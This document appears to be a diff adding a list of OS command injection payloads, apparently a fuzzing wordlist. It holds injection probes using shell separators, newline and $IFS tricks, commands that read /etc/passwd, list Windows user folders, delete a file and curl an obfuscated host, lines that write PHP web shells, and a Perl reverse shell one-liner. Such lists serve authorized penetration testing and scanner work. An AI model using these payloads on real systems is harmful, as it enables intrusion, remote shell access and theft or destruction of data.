+'%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+;%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+|%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+||%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+"%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+;%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+|%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+||%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+"%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+;%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+|%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+||%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+"%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+;%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+|%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+||%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+"%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+&&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+;%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+|%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+||%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+%0Aid
+%0a id %0a
+%0Aid%0A
+%0a ping -i 30 127.0.0.1 %0a
+"%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #
+%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #
+'%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #
+"%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |
+%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |
+'%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |
+"%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &
+%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &
+'%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &
+"%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
+%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
+'%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
+"%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
+%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
+'%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
+"%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //
+%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //
+'%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //
+"%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi "
+%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi 
+'%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '
+"%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\
+%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\
+'%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%20{${sleep(3)}}
+"| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 '
+'| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 '
+| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 '
+"| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1 
+'| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1 
+| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1 
+"| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //
+'| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //
+| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //
+"| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 "
+'| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 "
+| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 "
+"| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\
+'| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\
+| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\
+"| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |
+'| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |
+| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |
+"| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
+'| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
+| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #
+"| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
+'| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
+| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &
+a);id
+a);id;
+a);id|
+a)|id
+a)|id;
+a;id
+a;id;
+a;id|
+a|id
+a|id|
+a;id\n
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a|/usr/bin/id
+|/bin/ls -al
+cat /etc/hosts
+cat /etc/passwd
+`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`
+& dir
+&& dir
+&&dir
+; dir
+| dir
+& dir C:\
+&& dir C:\
+; dir C:\
+| dir C:\
+dir C:\
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+| dir C:\Documents and Settings\*
+dir C:\Documents and Settings\*
+& dir C:\Users
+&& dir C:\Users
+; dir C:\Users
+| dir C:\Users
+dir C:\Users
+"&&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+"&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+";echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+"||echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+"|echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+"echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+&&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+'&&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+'&echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+';echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+'||echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+'|echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+'echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+;echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+||echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+|echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+"&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+"&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+"&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+"&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+";echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+";echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+"||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+"||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+"|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+"|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+"echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+"echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+'&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+'&&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+'&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+'&echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+';echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+';echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+'||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+'||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+'|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+'|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+'echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+'echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+;echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+;echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+||echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+|echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+"&&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+"&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+";echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+"||echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+"|echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+"echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+&&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+'&&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+'&echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+';echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+'||echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+'|echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+'echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+;echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+||echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+|echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+"&&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+"&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+";echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+"||echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+"|echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+"echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+&&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+'&&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+'&echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+';echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+'||echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+'|echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+'echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+;echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+||echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+|echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+echo$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+"&&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+"&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+";echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+"||echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+"|echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+"echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+&&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+'&&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+'&echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+';echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+'||echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+'|echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+'echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+;echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+||echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+|echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+"&&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+"&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+";echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+"||echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+"|echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+"echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+&&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+'&&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+'&echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+';echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+'||echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+'|echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+'echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+;echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+||echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+|echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+echo$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+"&&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+"&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+";echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+"||echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+"|echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+"echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+&&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+'&&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+'&echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+';echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+'||echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+'|echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+'echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+;echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+||echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+|echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+echo$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+"&&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+"&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+";echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+"||echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+"|echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+"echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+&&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+'&&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+'&echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+';echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+'||echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+'|echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+'echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+;echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+||echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+|echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+echo$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+echo $(rm SYCGSY.txt > SYCGSY.txt)
+"&&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+"&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+";echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+"||echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+"|echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+"echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+&&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+'&&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+'&echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+';echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+'||echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+'|echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+'echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+;echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+||echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+|echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+echo FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+"&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+"&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+"&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+"&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+";echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+";echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+"||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+"||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+"|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+"|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+"echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+"echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'&&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'&echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+';echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+';echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+;echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+;echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+||echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+|echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+echo LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+&& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
